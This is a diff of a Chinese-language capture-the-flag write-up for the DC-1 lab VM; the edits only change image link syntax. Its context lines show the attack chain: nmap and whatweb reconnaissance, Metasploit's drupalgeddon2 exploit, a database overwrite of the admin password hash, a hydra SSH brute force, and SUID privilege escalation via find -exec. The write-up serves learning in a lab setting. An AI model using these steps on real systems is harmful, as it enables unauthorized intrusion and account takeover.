@@ -15,12 +15,12 @@ tags:
 ### Flag 1
 ---
 运行靶机，发现登陆界面
-![[dc1.0.png]]
+![dc1.0](../img/前置&&DC-1/dc1.0.png)
 运行虚拟机，用 nmap 扫描网段`192.168.1.x`
 ```bash
 nmap -sP 192.168.1.0/24
 ```
-![[dc1.1.png]]
+![dc1.1](../img/前置&&DC-1/dc1.1.png)
 ```
 Nmap scan report for 192.168.1.119 (192.168.1.119)
 Host is up (0.00023s latency).
@@ -31,18 +31,18 @@ MAC Address: 08:00:27:BE:D2:28 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
 nmap -sS 192.168.1.119
 nmap -sV -p22,80,111 192.168.1.119
 ```
-![[dc1.2.png]]
+![dc1.2](../img/前置&&DC-1/dc1.2.png)
 探测web指纹
 ```bash
 whatweb http://192.168.1.119
 ```
-![[dc1.3.png]]
+![dc1.3](../img/前置&&DC-1/dc1.3.png)
 ```
 http://192.168.1.119 [200 OK] Apache[2.2.22], Content-Language[en], Country[RESERVED][ZZ], Drupal, HTTPServer[Debian Linux][Apache/2.2.22 (Debian)], IP[192.168.1.119], JQuery, MetaGenerator[Drupal 7 (http://drupal.org)], PHP[5.4.45-0+deb7u14], PasswordField[pass], Script[text/javascript], Title[Welcome to Drupal Site | Drupal Site], UncommonHeaders[x-generator], X-Powered-By[PHP/5.4.45-0+deb7u14]
 ```
 事实上，访问`http://192.168.1.119`
-![[dc1.4.png]]
-![[dc1.5.png]]
+![dc1.4](../img/前置&&DC-1/dc1.4.png)
+![dc1.5](../img/前置&&DC-1/dc1.5.png)
 使用 Wappalyzer 插件分析可知，该靶机使用了 Drupal[^1] 7 作为网站的CMS，查询可知 Drupal 在版本7.x~8.x存在远程执行漏洞。于是启用 metasploit
 ```bash
 msfconsole
@@ -50,7 +50,7 @@ msfconsole
 ```Metasploit
 search drupal
 ```
-![[dc1.6.png]]
+![dc1.6](../img/前置&&DC-1/dc1.6.png)
 尝试采用`exploit/unix/webapp/drupal_drupalgeddon2`剥削
 ```Metasploit
 use 1
@@ -58,7 +58,7 @@ options
 set rhosts 192.168.1.119
 run
 ```
-![[dc1.7.png]]
+![dc1.7](../img/前置&&DC-1/dc1.7.png)
 成功，查看网络目录结构
 ```Metasploit
 meterpreter > ls
@@ -92,7 +92,7 @@ cat settings.php
  *
  */
 ```
-![[dc1.8.png]]
+![dc1.8](../img/前置&&DC-1/dc1.8.png)
 
 ### Flag 3
 ---
@@ -138,7 +138,7 @@ USE drupaldb;
 UPDATE users SET pass="$S$DF9AbrdTebr0b25D.AIlomKqp0jjVVLoDW5VZa9t5tnMRdQ/hSU2" WHERE name="admin";
 ```
 这样就获得了网站的权限
-![[dc1.9.png]]
+![dc1.9](../img/前置&&DC-1/dc1.9.png)
 找到==**Flag3**==
 ```
 Special PERMS will help FIND the passwd - but you'll need to -exec that command to work out how to get what's in the shadow.
@@ -174,7 +174,7 @@ hydra -l flag4 -P /usr/share/john/password.lst 192.168.1.119 ssh
 ```bash
 ssh flag4@192.168.1.119
 ```
-![[dc1.10.png]]
+![dc1.10](../img/前置&&DC-1/dc1.10.png)
 `cd /root`发现权限不足
 **开始提权部分：**
 首先考虑使用 SUID[^2] 提权找到一个属于 root 的有 s 权限的文件
@@ -187,7 +187,7 @@ find、bash、nmap、vim、more、less、nano、cp
 find / -perm -4000 2>/dev/null
 find / -perm -u=s -type f 2>/dev/null
 ```
-![[dc1.11.png]]
+![dc1.11](../img/前置&&DC-1/dc1.11.png)
 **发现 `find` 命令是突破口，于是以此提权**
 ```bash
 find . -exec "/bin/bash" \;
